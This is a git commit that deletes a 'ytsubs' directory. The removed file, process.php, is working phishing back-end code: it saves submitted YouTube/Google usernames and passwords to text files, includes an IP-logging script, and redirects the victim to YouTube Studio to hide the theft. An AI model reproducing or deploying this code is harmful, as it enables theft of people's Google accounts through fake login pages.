982add8e1b8ee2e6d55d0af848b81885b45c95f3
Mr.Ruthless Devil <77040067+RDXLR@users.noreply.github.com>
2022-04-07 15:39:16 +0530

    Delete ytsubs directory

--- ytsubs/process.php
+++
@@ -1,8 +0,0 @@
-<?php
-include 'ip.php';
-file_put_contents("usernames.txt", "Youtube/Google Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
-?>
-<?php
-file_put_contents("pass.txt", "Youtube/Google password : " . $pswrepeat = $_POST['pswrepeat'] . "\n", FILE_APPEND);
-header('Location: https://studio.youtube.com/');
-?>
